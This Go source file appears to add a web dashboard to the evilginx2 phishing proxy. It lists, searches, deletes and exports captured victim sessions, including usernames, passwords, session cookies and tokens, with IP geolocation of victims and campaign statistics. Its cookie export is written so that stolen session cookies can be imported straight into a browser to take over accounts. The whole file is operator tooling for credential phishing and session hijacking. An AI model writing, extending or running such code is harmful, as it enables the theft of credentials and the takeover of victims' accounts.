package dashboard

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"

	"github.com/kgretzky/evilginx2/database"
)

// sessionView is a JSON-friendly view of a captured session.
type sessionView struct {
	Id          int               `json:"id"`
	SessionId   string            `json:"session_id"`
	Phishlet    string            `json:"phishlet"`
	Username    string            `json:"username"`
	Password    string            `json:"password"`
	LandingURL  string            `json:"landing_url"`
	RemoteAddr  string            `json:"remote_addr"`
	UserAgent   string            `json:"useragent"`
	Custom      map[string]string `json:"custom,omitempty"`
	BodyTokens  map[string]string `json:"body_tokens,omitempty"`
	HttpTokens  map[string]string `json:"http_tokens,omitempty"`
	CookieCount int               `json:"cookie_count"`
	Captured    bool              `json:"captured"`
	CreateTime  int64             `json:"create_time"`
	UpdateTime  int64             `json:"update_time"`
	Geo         *GeoInfo          `json:"geo,omitempty"`
}

// geoLookup returns geolocation for an IP, or nil if geoip is disabled/unknown.
func (s *Server) geoLookup(addr string) *GeoInfo {
	if s.geoip == nil {
		return nil
	}
	return s.geoip.Lookup(addr)
}

func isCaptured(s *database.Session) bool {
	return s.Username != "" || s.Password != "" || len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
}

func cookieCount(s *database.Session) int {
	n := 0
	for _, m := range s.CookieTokens {
		n += len(m)
	}
	return n
}

func toSessionView(s *database.Session, full bool) sessionView {
	v := sessionView{
		Id:          s.Id,
		SessionId:   s.SessionId,
		Phishlet:    s.Phishlet,
		Username:    s.Username,
		Password:    s.Password,
		LandingURL:  s.LandingURL,
		RemoteAddr:  s.RemoteAddr,
		UserAgent:   s.UserAgent,
		CookieCount: cookieCount(s),
		Captured:    isCaptured(s),
		CreateTime:  s.CreateTime,
		UpdateTime:  s.UpdateTime,
	}
	if full {
		v.Custom = s.Custom
		v.BodyTokens = s.BodyTokens
		v.HttpTokens = s.HttpTokens
	}
	return v
}

func (s *Server) loadSessions() ([]*database.Session, error) {
	return s.db.ListSessions()
}

func (s *Server) handleListSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := s.loadSessions()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to load sessions")
		return
	}

	q := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("q")))
	phishlet := r.URL.Query().Get("phishlet")
	capturedOnly := r.URL.Query().Get("captured") == "true"

	views := []sessionView{}
	for _, sess := range sessions {
		if phishlet != "" && sess.Phishlet != phishlet {
			continue
		}
		if capturedOnly && !isCaptured(sess) {
			continue
		}
		if q != "" {
			hay := strings.ToLower(sess.Username + " " + sess.Password + " " + sess.RemoteAddr + " " + sess.LandingURL + " " + sess.Phishlet)
			if !strings.Contains(hay, q) {
				continue
			}
		}
		v := toSessionView(sess, false)
		v.Geo = s.geoLookup(sess.RemoteAddr)
		views = append(views, v)
	}
	// newest first
	sort.Slice(views, func(i, j int) bool { return views[i].CreateTime > views[j].CreateTime })

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"sessions": views,
		"total":    len(views),
	})
}

func (s *Server) handleGetSession(w http.ResponseWriter, r *http.Request) {
	id, _ := strconv.Atoi(mux.Vars(r)["id"])
	sess, err := s.findSessionById(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	view := toSessionView(sess, true)
	view.Geo = s.geoLookup(sess.RemoteAddr)
	resp := map[string]interface{}{
		"session":      view,
		"cookies":      sess.CookieTokens,
		"cookies_json": cookieTokensToJSON(sess.CookieTokens),
	}
	writeJSON(w, http.StatusOK, resp)
}

func (s *Server) findSessionById(id int) (*database.Session, error) {
	sessions, err := s.db.ListSessions()
	if err != nil {
		return nil, err
	}
	for _, sess := range sessions {
		if sess.Id == id {
			return sess, nil
		}
	}
	return nil, fmt.Errorf("not found")
}

func (s *Server) handleDeleteSession(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	id, _ := strconv.Atoi(mux.Vars(r)["id"])
	if err := s.db.DeleteSessionById(id); err != nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	s.store.Audit(u.Username, "delete_session", strconv.Itoa(id), "", clientIP(r))
	s.notifySessions()
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

// handleExportSessions streams all (optionally filtered) sessions as CSV or JSON.
func (s *Server) handleExportSessions(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	sessions, err := s.loadSessions()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to load sessions")
		return
	}
	phishlet := r.URL.Query().Get("phishlet")
	capturedOnly := r.URL.Query().Get("captured") == "true"
	format := r.URL.Query().Get("format")

	filtered := []*database.Session{}
	for _, sess := range sessions {
		if phishlet != "" && sess.Phishlet != phishlet {
			continue
		}
		if capturedOnly && !isCaptured(sess) {
			continue
		}
		filtered = append(filtered, sess)
	}
	sort.Slice(filtered, func(i, j int) bool { return filtered[i].CreateTime > filtered[j].CreateTime })

	s.store.Audit(u.Username, "export_sessions", phishlet, fmt.Sprintf("count=%d format=%s", len(filtered), format), clientIP(r))

	if format == "json" {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", "attachment; filename=evilginx-sessions.json")
		out := make([]map[string]interface{}, 0, len(filtered))
		for _, sess := range filtered {
			view := toSessionView(sess, true)
			view.Geo = s.geoLookup(sess.RemoteAddr)
			out = append(out, map[string]interface{}{
				"session":      view,
				"cookies_json": cookieTokensToJSON(sess.CookieTokens),
			})
		}
		json.NewEncoder(w).Encode(out)
		return
	}

	// default CSV
	w.Header().Set("Content-Type", "text/csv")
	w.Header().Set("Content-Disposition", "attachment; filename=evilginx-sessions.csv")
	cw := csv.NewWriter(w)
	cw.Write([]string{"id", "phishlet", "username", "password", "remote_addr", "country", "city", "asn", "useragent", "landing_url", "captured", "cookies", "create_time"})
	for _, sess := range filtered {
		country, city, asn := "", "", ""
		if g := s.geoLookup(sess.RemoteAddr); g != nil {
			country = g.CountryCode
			city = g.City
			if g.ASN != 0 {
				asn = "AS" + strconv.FormatUint(uint64(g.ASN), 10)
			}
		}
		cw.Write([]string{
			strconv.Itoa(sess.Id),
			sess.Phishlet,
			sess.Username,
			sess.Password,
			sess.RemoteAddr,
			country,
			city,
			asn,
			sess.UserAgent,
			sess.LandingURL,
			strconv.FormatBool(isCaptured(sess)),
			strconv.Itoa(cookieCount(sess)),
			time.Unix(sess.CreateTime, 0).UTC().Format(time.RFC3339),
		})
	}
	cw.Flush()
}

// handleStats returns aggregate counters for the dashboard landing page.
func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	sessions, err := s.loadSessions()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to load sessions")
		return
	}
	var total, captured, withCreds, withCookies int
	perPhishlet := map[string]int{}
	const day = 24 * 60 * 60
	now := time.Now().UTC().Unix()
	// 14-day timeline of new sessions
	const days = 14
	timeline := make([]map[string]interface{}, days)
	buckets := make([]int, days)

	for _, sess := range sessions {
		total++
		perPhishlet[sess.Phishlet]++
		if isCaptured(sess) {
			captured++
		}
		if sess.Username != "" || sess.Password != "" {
			withCreds++
		}
		if len(sess.CookieTokens) > 0 {
			withCookies++
		}
		ageDays := int((now - sess.CreateTime) / day)
		if ageDays >= 0 && ageDays < days {
			buckets[days-1-ageDays]++
		}
	}
	for i := 0; i < days; i++ {
		dayStart := now - int64((days-1-i))*day
		timeline[i] = map[string]interface{}{
			"date":  time.Unix(dayStart, 0).UTC().Format("2006-01-02"),
			"count": buckets[i],
		}
	}

	phishlets := s.cfg.ExportPhishlets()
	enabled := 0
	for _, p := range phishlets {
		if p.Enabled {
			enabled++
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"total_sessions":    total,
		"captured_sessions": captured,
		"with_credentials":  withCreds,
		"with_cookies":      withCookies,
		"lures":             s.cfg.LureCount(),
		"phishlets_total":   len(phishlets),
		"phishlets_enabled": enabled,
		"per_phishlet":      perPhishlet,
		"timeline":          timeline,
	})
}

// cookieTokensToJSON mirrors the format evilginx's terminal exports, so cookies
// can be imported directly with the StorageAce browser extension.
func cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
	type cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
	}
	var cookies []*cookie
	exp := time.Now().Add(365 * 24 * time.Hour).Unix()
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: exp,
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if strings.HasPrefix(k, "__Host-") || strings.HasPrefix(k, "__Secure-") {
				c.Secure = true
			}
			if strings.HasPrefix(domain, ".") {
				c.HostOnly = false
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	b, _ := json.Marshal(cookies)
	return string(b)
}
